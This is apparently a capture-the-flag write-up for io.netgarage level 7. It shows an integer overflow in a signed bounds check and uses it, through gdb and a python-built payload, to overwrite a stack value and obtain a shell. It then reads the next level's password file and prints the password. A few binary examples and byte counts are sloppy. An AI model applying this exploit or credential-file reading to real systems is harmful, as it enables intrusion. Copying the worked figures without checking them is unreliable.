---

title: Level 7
link: ssh level7@io.netgarage.org

---

This one explores the magic underlying the fixed-size integer mathematics done in C. Although it's not clear on first read, the vulnerability of the code is here:

    if(count >= 10)
            return 1;

Indeed, this lacks an important check, but let's explore a few different cases for integer multiplications first:

    #include <stdio.h>
    #include <stdlib.h>

    void print_binary(int number) {
        int digit;

        printf("%d: ", number);
        for(digit = 31; digit >= 0; digit--) {
            printf("%c", number & (1 << digit) ? '1' : '0');
        }

        printf("\n");
    }

    void test(char *input){
        int count = atoi(input);
        int size = sizeof(int);

        printf("%s (%s) \t %d * %d = %d\n", input, (count >= 10)?"invalid":"valid", count, size, count * size);

        print_binary(count);
        print_binary(size*count);
    }

    int main(int argc, char *argv[]){
        test("1");
        test("-1");
        test("10");
        test("-10");
        test("127");
        test("-127");
        test("-2147483648");
        return 0;
    }

First and second cases are obvious, you take 1, multiply it by 4 (equal to `sizeof(int)`) and you get 4, same for 10 and 40. If you look at the binary representation, you can see that multiplying by 4 is equivalent to a left shift of 2:

    1:  00000001
    4:  00000100
    10: 00001010
    40: 00101000

Easy peasy, now if you have a negative number? You may recall the two's complement rules. You basically take the positive representation of the number, flip all digits (1 to 0 and 0 to 1) and add 1:

    1:  00000001  ->  11111110 + 1 = 11111111 = -1
    10: 00001010  ->  11110101 + 1 = 11110110 = -10

So now interesting case, what if the number we have is really low, in the case of our 8 bits representation here, what about 128 and -128 ?

    127:  0111111 * 4 = 11111100 = -4
    -127: 1000001 * 4 = 00000100 = 4

You can see the problem clearly, if we overflow our storage limit for the number it's acting weird. It's 100% normal and logic, but it might seems weird at first.

Now how does this relates to our challenge? Well it's exactly the same idea, remember our condition:

    if(count >= 10)
            return 1;

This checks if the count is effectively lower than 11, but not if it's negative. And if we're going low enough we can make the multiplication of this number and 4 a positive number again!

Because the instruction using this is a `memcpy` we can overflow or memory to write into count. Let's spin `gdb` to study the distance between the two memory addresses:

Firstly, let's add a breakpoint just at the `memcpy` instruction, to study the memory before and after:

    level7@io:/levels$ gdb level07
    (gdb) disass main
    Dump of assembler code for function main:
    ...
       0x08048462 <+78>:    call   0x8048334 <memcpy@plt>
       0x08048467 <+83>:    cmpl   $0x574f4c46,-0xc(%ebp)
    ...
    End of assembler dump.
    (gdb) b *0x08048462
    Breakpoint 1 at 0x8048462

We can then run the program:

    (gdb) r 9 "AAAAAAAAA"
    Starting program: /levels/level07 9 "AAAAAAAAA"
    /bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)

    Breakpoint 1, 0x08048462 in main ()

The stack used to call `memcpy` is:

    (gdb) x/20wx $esp
    0xbffffbd0:     0xbffffbf0      0xbffffe1c      0x00000024      0xb7eb5f16
    0xbffffbe0:     0x0177ff8e      0xbffffc0e      0xb7e2cbf8      0xb7e51243
    0xbffffbf0:     0x00000000      0x002c307d      0x00000001      0x000000bf
    0xbffffc00:     0xbffffe0a      0x08049688      0xbffffc18      0x080482f0
    0xbffffc10:     0x080484d0      0x08049688      0xbffffc38      0x080484e9

We can recognise the `buf` address (currently empty), then the `argv[2]` address (filled with 'A'), then the count:

    (gdb) x 0xbffffbf0
    0xbffffbf0:     0x00000000
    (gdb) x 0xbffffe1c
    0xbffffe1c:     0x41414141
    (gdb) print 0x24
    $1 = 36

Then after running the `memcpy`, the `buf` is filled with 'A':

    (gdb) ni
    0x08048467 in main ()
    (gdb) x 0xbffffbf0
    0xbffffbf0:     0x41414141
    (gdb) x/20wx 0xbffffbf0
    0xbffffbf0:     0x41414141      0x41414141      0x44580041      0x45535f47
    0xbffffc00:     0x4f495353      0x44495f4e      0x3436363d      0x53003333
    0xbffffc10:     0x4c4c4548      0x08049688      0xbffffc38      0x080484e9
    0xbffffc20:     0xb7fc93c4      0xb7fff000      0x080484db      0x00000009
    0xbffffc30:     0x080484d0      0x00000000      0x00000000      0xb7e39a63

We have our first address!

To find the second one, look again at the `cmp` instruction right after the `memcpy`, it's using the `$ebp-0xc` memory address, which is our `9` input:

    (gdb) x $ebp-0xc
    0xbffffc2c:     0x00000009

And we can see the distance between the `buf` address and the `count` now we have the addresses:

    (gdb) x/20wx 0xbffffbf0
    0xbffffbf0:     0x41414141      0x41414141      0x44580041      0x45535f47
    0xbffffc00:     0x4f495353      0x44495f4e      0x3436363d      0x53003333
    0xbffffc10:     0x4c4c4548      0x08049688      0xbffffc38      0x080484e9
    0xbffffc20:     0xb7fc93c4      0xb7fff000      0x080484db      0x00000009
    0xbffffc30:     0x080484d0      0x00000000      0x00000000      0xb7e39a63
    (gdb) print 0xbffffc2c - 0xbffffbf0
    $1 = 60

Let's try to overwrite the 60 bytes with 'A', first we need to have a negative number that will provide the good positive value once multiplied by 4. On a 32 bits system, we can take the highest negative number, which is 2^31, and then add our number divided by 4, so when the shift happens, the leading 1 leaves and our number gets rightly moved:

    -2^31 =              10000000 00000000 00000000 00000000
    -2^31 + 64/4 =       10000000 00000000 00000000 00010000
    (-2^31 + 64/4) * 4 = 00000000 00000000 00000000 01000000
    64 =                 00000000 00000000 00000000 01000000

Let's try with `-2147483632` and 64 'A':


    (gdb) r -2147483632 $(python -c 'print "A"*64)
    Starting program: /levels/level07 -2147483632 $(python -c 'print "A"*64')
    /bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)

    Breakpoint 1, 0x08048462 in main ()
    (gdb) x/20wx 0xbffffbb0
    0xbffffbb0:     0x00000000      0x002c307d      0x00000001      0x000000bf
    0xbffffbc0:     0xbffffdc9      0x08049688      0xbffffbd8      0x080482f0
    0xbffffbd0:     0x080484d0      0x08049688      0xbffffbf8      0x080484e9
    0xbffffbe0:     0xb7fc93c4      0xb7fff000      0x080484db      0x80000010
    0xbffffbf0:     0x080484d0      0x00000000      0x00000000      0xb7e39a63
    (gdb) ni
    0x08048467 in main ()
    (gdb) x/20wx 0xbffffbb0
    0xbffffbb0:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffbc0:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffbd0:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffbe0:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffbf0:     0x080484d0      0x00000000      0x00000000      0xb7e39a63

We successfully overwrote our address! (it was `0x80000010` at `0xbffffbec`). Now let's override the right value:


    (gdb) r -2147483632 $(python -c 'print "A"*60 + "\x46\x4c\x4f\x57"')
    Starting program: /levels/level07 -2147483632 $(python -c 'print "A"*60 + "\x46\x4c\x4f\x57"')
    /bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)

    Breakpoint 1, 0x08048462 in main ()
    (gdb) x/20wx 0xbffffbb0
    0xbffffbb0:     0x00000000      0x002c307d      0x00000001      0x000000bf
    0xbffffbc0:     0xbffffdc9      0x08049688      0xbffffbd8      0x080482f0
    0xbffffbd0:     0x080484d0      0x08049688      0xbffffbf8      0x080484e9
    0xbffffbe0:     0xb7fc93c4      0xb7fff000      0x080484db      0x80000010
    0xbffffbf0:     0x080484d0      0x00000000      0x00000000      0xb7e39a63
    (gdb) ni
    0x08048467 in main ()
    (gdb) x/20wx 0xbffffbb0
    0xbffffbb0:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffbc0:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffbd0:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbffffbe0:     0x41414141      0x41414141      0x41414141      0x574f4c46
    0xbffffbf0:     0x080484d0      0x00000000      0x00000000      0xb7e39a63
    (gdb) c
    Continuing.
    WIN!
    process 9299 is executing new program: /bin/bash
    sh: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
    sh-4.3$ whoami
    level7

Nice, let's do that outside of `gdb` now:

    level7@io:/levels$ ./level07 -2147483632 $(python -c 'print "A"*60 + "\x46\x4c\x4f\x57"')
    WIN!
    sh: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
    sh-4.3$ whoami
    level8
    ome/
    sh-4.3$ cat /home/level8/.pass
    VSIhoeMkikH6SGht

> VSIhoeMkikH6SGht
